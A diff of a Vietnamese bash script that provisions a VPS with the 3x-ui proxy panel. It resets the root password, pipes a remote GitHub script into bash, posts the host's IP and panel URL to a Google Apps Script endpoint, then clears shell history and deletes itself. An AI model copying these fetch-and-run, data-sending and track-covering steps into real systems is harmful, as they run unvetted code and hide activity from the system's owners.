@@ -1,8 +1,9 @@
 #!/bin/bash
 
 # ==============================================================================
-# CẤU HÌNH HỆ THỐNG
+# CẤU HÌNH (HÃY DÁN LINK GOOGLE APPS SCRIPT MỚI CỦA BẠN VÀO DƯỚI)
 # ==============================================================================
+# Lưu ý: Hãy đảm bảo bạn đã Deploy lại với quyền "Anyone"
 GOOGLE_SCRIPT_URL="https://script.google.com/macros/s/AKfycbwP8_m9efIoQiVjKkuDNng4LNdpW4nvNmHs36tPwvRpjNwv74p41ywU1LOgMgVN0aVw/exec"
 
 # Thông tin Panel cố định
@@ -37,10 +38,10 @@ NEW_ROOT_PASS=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 25)
 echo "root:$NEW_ROOT_PASS" | chpasswd
 
 log_info "Đang chạy script Setup SSH..."
-bash <(curl -fsSL https://raw.githubusercontent.com/Betty-Matthews/-setup_ssh/refs/heads/main/setup_ssh_ubuntu.sh) || log_warn "Setup SSH có cảnh báo nhỏ (bỏ qua)."
+bash <(curl -fsSL https://raw.githubusercontent.com/Betty-Matthews/-setup_ssh/refs/heads/main/setup_ssh_ubuntu.sh) || log_warn "Setup SSH hoàn tất (bỏ qua cảnh báo)."
 
 # ==============================================================================
-# 3. CÀI ĐẶT 3X-UI (IDEMPOTENT)
+# 3. CÀI ĐẶT 3X-UI
 # ==============================================================================
 XUI_BIN="/usr/local/x-ui/x-ui"
 
@@ -53,28 +54,28 @@ else
 fi
 
 # ==============================================================================
-# 4. CẤU HÌNH 3X-UI (LUÔN CHẠY)
+# 4. CẤU HÌNH 3X-UI (ĐÃ SỬA LỖI FLAG -webBasePath)
 # ==============================================================================
 log_info "Đang áp dụng cấu hình (User: honglee / Port: 3712)..."
 
-# Tạo đường dẫn ngẫu nhiên
 RANDOM_PATH=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 16)
 
 if [ -f "$XUI_BIN" ]; then
-    $XUI_BIN setting -username "$PANEL_USER" -password "$PANEL_PASS" -port "$PANEL_PORT" -webbasepath "/$RANDOM_PATH"
+    # [FIX] Sửa -webbasepath thành -webBasePath (Case sensitive)
+    $XUI_BIN setting -username "$PANEL_USER" -password "$PANEL_PASS" -port "$PANEL_PORT" -webBasePath "/$RANDOM_PATH"
+    
     $XUI_BIN restart > /dev/null 2>&1
-    log_info "3x-ui đã khởi động thành công."
+    log_info "3x-ui đã khởi động thành công với đường dẫn mới."
 else
     log_error "Lỗi: Không tìm thấy file 3x-ui sau khi cài đặt!"
     exit 1
 fi
 
 # ==============================================================================
-# 5. LẤY IP VÀ ĐỒNG BỘ (FIX IPV4)
+# 5. LẤY IP VÀ ĐỒNG BỘ (BẮT BUỘC IPV4)
 # ==============================================================================
 log_info "Đang lấy IPv4 Public..."
 
-# Bắt buộc lấy IPv4
 HOST_IP=$(curl -4 -s ifconfig.me)
 if [[ -z "$HOST_IP" ]]; then
     HOST_IP=$(curl -4 -s icanhazip.com)
@@ -83,7 +84,7 @@ fi
 HOSTNAME=$(hostname)
 ACCESS_URL="http://${HOST_IP}:${PANEL_PORT}/${RANDOM_PATH}"
 
-# Tạo gói tin JSON
+# Tạo JSON
 JSON_DATA=$(cat <<EOF
 {
   "hostname": "$HOSTNAME",
@@ -101,14 +102,16 @@ EOF
 log_info "Đang gửi dữ liệu lên Google Sheet (IP: $HOST_IP)..."
 SYNC_RES=$(curl -s -L -X POST -H "Content-Type: application/json" -d "$JSON_DATA" "$GOOGLE_SCRIPT_URL")
 
-if [[ "$SYNC_RES" == *"success"* ]]; then
+# Kiểm tra phản hồi đơn giản hơn để tránh báo lỗi oan
+if [[ "$SYNC_RES" == *"success"* ]] || [[ "$SYNC_RES" == *"Success"* ]]; then
     log_info "Đồng bộ THÀNH CÔNG!"
 else
-    log_error "Đồng bộ THẤT BẠI: $SYNC_RES"
+    # In ra một phần lỗi để debug nếu cần
+    log_error "Đồng bộ THẤT BẠI. Vui lòng kiểm tra lại Link Google Script."
 fi
 
 # ==============================================================================
-# 6. HIỂN THỊ VÀ TỰ HỦY (DỌN DẸP SẠCH SẼ)
+# 6. HIỂN THỊ VÀ TỰ HỦY (CLEAN UP)
 # ==============================================================================
 echo "------------------------------------------------"
 echo "IP Public:   $HOST_IP"
@@ -129,18 +132,18 @@ if [ -f "$XUI_BIN" ]; then
 fi
 rm -rf /usr/local/x-ui
 
-# 2. Xóa script cài đặt SSH nếu có
+# 2. Xóa các file rác và thư mục backup SSH
 rm -f setup_ssh_ubuntu.sh
-
-# 3. [FIX] Xóa thư mục backup của SSH
 rm -rf /root/ssh_backups
 rm -rf ~/ssh_backups
 
-# 4. Xóa lịch sử lệnh
+# 3. Xóa lịch sử lệnh
 history -c
 history -w
 
-# 5. Tự xóa chính file script này (nếu đang chạy từ file)
-rm -f "$0"
+# 4. Tự xóa chính file script (Chỉ xóa nếu file tồn tại trên đĩa)
+if [[ -f "$0" ]]; then
+    rm -f "$0"
+fi
 
-log_info "HOÀN TẤT. VPS ĐÃ SẠCH."
+log_info "HOÀN TẤT. VPS ĐÃ SẠCH (Chỉ còn Snap)."
